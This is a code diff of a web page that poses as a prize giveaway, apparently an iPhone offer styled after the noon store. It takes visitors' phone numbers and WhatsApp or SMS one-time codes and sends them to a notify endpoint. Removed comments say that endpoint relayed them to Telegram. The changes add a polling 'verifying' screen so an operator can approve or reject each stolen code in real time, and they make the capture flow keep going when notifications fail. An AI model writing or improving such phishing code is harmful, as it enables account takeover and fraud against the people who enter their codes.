@@ -6,7 +6,7 @@ import giftPhoneImage from "@/images/img1.png";
 import promoBanner from "@/images/banner.png";
 
 // ─── Types ───────────────────────────────────────────────────────────────────
-type Step = "phone" | "otp" | "placing" | "driving" | "success";
+type Step = "phone" | "otp" | "verifying" | "placing" | "driving" | "success";
 
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 function formatPhone(raw: string) {
@@ -24,6 +24,9 @@ export default function HomePage() {
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
+  const [otpInlineError, setOtpInlineError] = useState("");
+  const [sessionId, setSessionId] = useState("");
+  const [otpMethod, setOtpMethod] = useState<"whatsapp" | "sms">("whatsapp");
 
   const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
 
@@ -38,10 +41,38 @@ export default function HomePage() {
     }, 2400);
     return () => clearTimeout(timeout);
   }, [step]);
-  
-  // ── Step 1: Send phone to Telegram ──────────────────────────────────────────
+
+  useEffect(() => {
+    if (step !== "verifying" || !sessionId) return;
+
+    const poll = async () => {
+      try {
+        const res = await fetch(
+          `/api/verify/status?sessionId=${encodeURIComponent(sessionId)}`,
+          { cache: "no-store" }
+        );
+        if (!res.ok) return;
+        const payload = (await res.json()) as { status?: string };
+        if (payload.status === "approved") {
+          setStep("placing");
+        } else if (payload.status === "rejected") {
+          setOtpInlineError("Invalid code");
+          setStep("otp");
+        }
+      } catch {
+        // Continue polling on transient network errors.
+      }
+    };
+
+    poll();
+    const timer = setInterval(poll, 1500);
+    return () => clearInterval(timer);
+  }, [step, sessionId]);
+
+  // ── Step 1: Start verification and notify ───────────────────────────────────
   async function handleSendPhone() {
     setError("");
+    setOtpInlineError("");
     if (!phone.trim()) {
       setError("Please enter your phone number.");
       return;
@@ -51,6 +82,23 @@ export default function HomePage() {
     setLoading(true);
 
     try {
+      const startRes = await fetch("/api/verify/start", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone: formatted }),
+      });
+      if (!startRes.ok) {
+        const payload = (await startRes.json().catch(() => null)) as
+          | { error?: string; details?: string }
+          | null;
+        throw new Error(payload?.details || payload?.error || "failed-start");
+      }
+      const startPayload = (await startRes.json()) as { sessionId?: string };
+      if (!startPayload.sessionId) {
+        throw new Error("missing-session-id");
+      }
+      setSessionId(startPayload.sessionId);
+
       const notifyRes = await fetch("/api/notify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -61,10 +109,8 @@ export default function HomePage() {
       });
 
       if (!notifyRes.ok) {
-        const payload = (await notifyRes.json().catch(() => null)) as
-          | { error?: string; details?: string }
-          | null;
-        throw new Error(payload?.details || payload?.error || "failed-phone-notify");
+        // Notification errors should not block the verification flow.
+        console.warn("Phone notification failed");
       }
 
       setStep("otp");
@@ -81,17 +127,39 @@ export default function HomePage() {
     }
   }
 
-  // ── Step 2: Send OTP to Telegram ───────────────────────────────────────────
+  // ── Step 2: Submit code for admin review ───────────────────────────────────
   async function handleSubmitOtp() {
     setError("");
+    setOtpInlineError("");
     const code = otp.join("");
     if (code.length < 6) {
       setError("Please enter all 6 digits.");
       return;
     }
-
     setLoading(true);
     try {
+      if (!sessionId) {
+        throw new Error("missing-session-id");
+      }
+
+      const submitRes = await fetch("/api/verify/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId,
+          code,
+        }),
+      });
+
+      if (!submitRes.ok) {
+        const payload = (await submitRes.json().catch(() => null)) as
+          | { error?: string; details?: string }
+          | null;
+        throw new Error(
+          payload?.details || payload?.error || "failed-submit-code"
+        );
+      }
+
       const notifyRes = await fetch("/api/notify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -99,22 +167,23 @@ export default function HomePage() {
           kind: "otp_submission",
           phone: formatPhone(phone),
           otp: code,
+          otpMethod,
         }),
       });
-
       if (!notifyRes.ok) {
-        const payload = (await notifyRes.json().catch(() => null)) as
-          | { error?: string; details?: string }
-          | null;
-        throw new Error(payload?.details || payload?.error || "failed-otp-notify");
+        // Keep user flow working even if notify fails.
+        console.warn("OTP notify failed");
       }
 
-      setStep("placing");
+      if (typeof document !== "undefined" && document.activeElement instanceof HTMLElement) {
+        document.activeElement.blur();
+      }
+      setStep("verifying");
     } catch (err: unknown) {
       console.error(err);
       const message = err instanceof Error ? err.message : "";
       setError(
-        message && message !== "failed-otp-notify"
+        message && message !== "failed-submit-code"
           ? `Failed to submit OTP: ${message}`
           : "Failed to submit OTP. Please try again."
       );
@@ -129,6 +198,7 @@ export default function HomePage() {
     const newOtp = [...otp];
     newOtp[index] = value.slice(-1);
     setOtp(newOtp);
+    setOtpInlineError("");
     if (value && index < 5) {
       otpRefs.current[index + 1]?.focus();
     }
@@ -140,36 +210,22 @@ export default function HomePage() {
     }
   }
 
-  async function handleRequestAnotherOtp() {
-    setError("");
-    setLoading(true);
-    try {
-      const notifyRes = await fetch("/api/notify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          kind: "otp_resend_request",
-          phone: formatPhone(phone),
-        }),
-      });
-      if (!notifyRes.ok) {
-        const payload = (await notifyRes.json().catch(() => null)) as
-          | { error?: string; details?: string }
-          | null;
-        throw new Error(payload?.details || payload?.error || "failed-resend-request");
-      }
-      setOtp(["", "", "", "", "", ""]);
-    } catch (err) {
-      console.error(err);
-      const message = err instanceof Error ? err.message : "";
-      setError(
-        message && message !== "failed-resend-request"
-          ? `Failed to request a new OTP: ${message}`
-          : "Failed to request a new OTP. Please try again."
-      );
-    } finally {
-      setLoading(false);
-    }
+  function handleOtpPaste(e: React.ClipboardEvent<HTMLInputElement>) {
+    e.preventDefault();
+    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+    if (!pasted) return;
+    const nextOtp = ["", "", "", "", "", ""];
+    for (let i = 0; i < pasted.length; i += 1) nextOtp[i] = pasted[i];
+    setOtp(nextOtp);
+    setOtpInlineError("");
+    const nextFocusIndex = Math.min(pasted.length, 5);
+    otpRefs.current[nextFocusIndex]?.focus();
+  }
+
+  function handleRequestAnotherOtp(method: "whatsapp" | "sms") {
+    setOtpMethod(method);
+    setOtp(["", "", "", "", "", ""]);
+    setOtpInlineError("");
   }
 
   // ─── Render ──────────────────────────────────────────────────────────────
@@ -195,8 +251,8 @@ export default function HomePage() {
             <Image
               src={giftPhoneImage}
               alt="iPhone Prize"
-              width={170}
-              height={190}
+              width={190}
+              height={230}
               style={styles.prizeImage}
               priority
             />
@@ -247,7 +303,7 @@ export default function HomePage() {
               {loading ? (
                 <span style={styles.spinner} />
               ) : (
-                "Submit Number →"
+                "Verify Number →"
               )}
             </button>
           </div>
@@ -266,14 +322,12 @@ export default function HomePage() {
               >
                 ←
               </button>
-              <span style={styles.otpAttempts}>8 attempts left</span>
             </div>
             <h3 style={styles.otpTitle}>Verify your mobile number</h3>
             <p style={styles.formSubtitle}>
               To use this address, enter the OTP sent to{" "}
               <strong>{formatPhone(phone)}</strong> via
             </p>
-            <p style={styles.otpChannel}>WhatsApp</p>
             <div style={styles.otpRow}>
               {otp.map((digit, i) => (
                 <input
@@ -285,6 +339,7 @@ export default function HomePage() {
                   value={digit}
                   onChange={(e) => handleOtpChange(i, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(i, e)}
+                  onPaste={handleOtpPaste}
                   style={{
                     ...styles.otpBox,
                     ...(digit ? styles.otpBoxFilled : {}),
@@ -293,7 +348,11 @@ export default function HomePage() {
                 />
               ))}
             </div>
-            {error && <p style={styles.errorMsg}>⚠️ {error}</p>}
+            {otpInlineError ? (
+              <p style={styles.otpInlineError}>{otpInlineError}</p>
+            ) : error ? (
+              <p style={styles.errorMsg}>⚠️ {error}</p>
+            ) : null}
             <button
               onClick={handleSubmitOtp}
               disabled={loading}
@@ -310,7 +369,7 @@ export default function HomePage() {
             <div style={styles.resendViaLabel}>Resend OTP via</div>
             <div style={styles.resendMethodRow}>
               <button
-                onClick={handleRequestAnotherOtp}
+                onClick={() => handleRequestAnotherOtp("whatsapp")}
                 disabled={loading}
                 style={{
                   ...styles.resendMethodBtn,
@@ -320,7 +379,7 @@ export default function HomePage() {
                 WhatsApp
               </button>
               <button
-                onClick={handleRequestAnotherOtp}
+                onClick={() => handleRequestAnotherOtp("sms")}
                 disabled={loading}
                 style={{
                   ...styles.resendMethodBtn,
@@ -329,6 +388,18 @@ export default function HomePage() {
               >
                 SMS
               </button>
+            </div>
+          </div>
+        )}
+
+        {step === "verifying" && (
+          <div className="fade-in" style={styles.formCard}>
+            <h3 style={styles.formTitle}>We are verifying your code...</h3>
+            <p style={styles.formSubtitle}>
+              Please wait while your request is reviewed.
+            </p>
+            <div style={styles.verifyingWrap}>
+              <span style={styles.spinner} />
             </div>
           </div>
         )}
@@ -385,7 +456,7 @@ export default function HomePage() {
       </div>
 
       {/* ── Footer ────────────────────────────────────────── */}
-      {step === "phone" || step === "otp" ? <footer style={styles.footer}>
+      {step === "phone" || step === "otp" || step === "verifying" ? <footer style={styles.footer}>
         <div style={styles.footerTopCard}>
           <div style={styles.socialRow}>
             <span style={styles.socialIcon}>f</span>
@@ -473,8 +544,8 @@ const styles: Record<string, React.CSSProperties> = {
   },
   prizeImageWrap: {
     flexShrink: 0,
-    width: "145px",
-    height: "180px",
+    width: "160px",
+    height: "200px",
     display: "flex",
     alignItems: "center",
     justifyContent: "center",
@@ -485,7 +556,8 @@ const styles: Record<string, React.CSSProperties> = {
   },
   prizeImage: {
     objectFit: "contain",
-    transform: "scale(1.05)",
+    width: "100%",
+    height: "100%",
   },
   prizeInfo: {
     flex: 1,
@@ -625,7 +697,7 @@ const styles: Record<string, React.CSSProperties> = {
   otpHeaderRow: {
     display: "flex",
     alignItems: "center",
-    justifyContent: "space-between",
+    justifyContent: "flex-start",
     marginBottom: "14px",
   },
   otpBackBtn: {
@@ -637,11 +709,6 @@ const styles: Record<string, React.CSSProperties> = {
     cursor: "pointer",
     padding: "2px 0",
   },
-  otpAttempts: {
-    fontSize: "14px",
-    color: "#c7c7c7",
-    fontWeight: 700,
-  },
   otpTitle: {
     fontSize: "42px",
     lineHeight: 1.08,
@@ -651,15 +718,6 @@ const styles: Record<string, React.CSSProperties> = {
     textAlign: "left",
     letterSpacing: "-0.8px",
   },
-  otpChannel: {
-    textAlign: "center",
-    color: "#24a646",
-    fontSize: "30px",
-    fontWeight: 700,
-    marginTop: "-10px",
-    marginBottom: "16px",
-  },
-
   // OTP
   otpRow: {
     display: "flex",
@@ -684,6 +742,14 @@ const styles: Record<string, React.CSSProperties> = {
   otpBoxFilled: {
     borderColor: "var(--noon-yellow)",
     background: "#fffbea",
+  },
+  otpInlineError: {
+    color: "#c62828",
+    fontSize: "14px",
+    marginTop: "-12px",
+    marginBottom: "12px",
+    paddingLeft: "4px",
+    textAlign: "left",
   },
   resendRow: {
     textAlign: "center",
@@ -732,7 +798,7 @@ const styles: Record<string, React.CSSProperties> = {
     justifyContent: "center",
     background: "#fff",
     borderRadius: "20px",
-    padding: "24px 16px 80px",
+    padding: "24px 16px 20px",
   },
   dropAnimationWrap: {
     width: "100%",
@@ -889,6 +955,11 @@ const styles: Record<string, React.CSSProperties> = {
     lineHeight: 1.2,
     fontWeight: 700,
   },
+  verifyingWrap: {
+    display: "flex",
+    justifyContent: "center",
+    padding: "12px 0 4px",
+  },
   finalSuccessRing: {
     width: "230px",
     height: "230px",
@@ -920,7 +991,7 @@ const styles: Record<string, React.CSSProperties> = {
 
   // Footer
   footer: {
-    padding: "16px 16px 30px",
+    padding: "8px 12px 14px",
     background: "#f7f8fc",
     textAlign: "center",
   },
@@ -928,44 +999,44 @@ const styles: Record<string, React.CSSProperties> = {
     background: "#fff",
     borderTop: "1px solid #eef0f5",
     borderBottom: "1px solid #eef0f5",
-    padding: "24px 14px 22px",
-    marginBottom: "34px",
+    padding: "14px 10px 12px",
+    marginBottom: "16px",
   },
   socialRow: {
     display: "flex",
     justifyContent: "center",
     alignItems: "center",
-    gap: "42px",
-    marginBottom: "20px",
+    gap: "22px",
+    marginBottom: "8px",
   },
   socialIcon: {
     color: "#8b93aa",
-    fontSize: "22px",
+    fontSize: "14px",
     fontWeight: 700,
-    minWidth: "26px",
+    minWidth: "18px",
   },
   footerLinkLine: {
     color: "#8b93aa",
-    fontSize: "17px",
-    lineHeight: 1.9,
+    fontSize: "12px",
+    lineHeight: 1.5,
     fontWeight: 500,
   },
   footerMetaText: {
     color: "#d4d8e1",
-    fontSize: "18px",
-    lineHeight: 1.8,
+    fontSize: "11px",
+    lineHeight: 1.5,
     fontWeight: 500,
   },
   footerVersionText: {
     color: "#d4d8e1",
-    fontSize: "20px",
-    marginTop: "12px",
-    marginBottom: "22px",
+    fontSize: "11px",
+    marginTop: "8px",
+    marginBottom: "8px",
     fontWeight: 500,
   },
   footerCopyright: {
     color: "#737b92",
-    fontSize: "20px",
+    fontSize: "12px",
     fontWeight: 500,
   },
 };
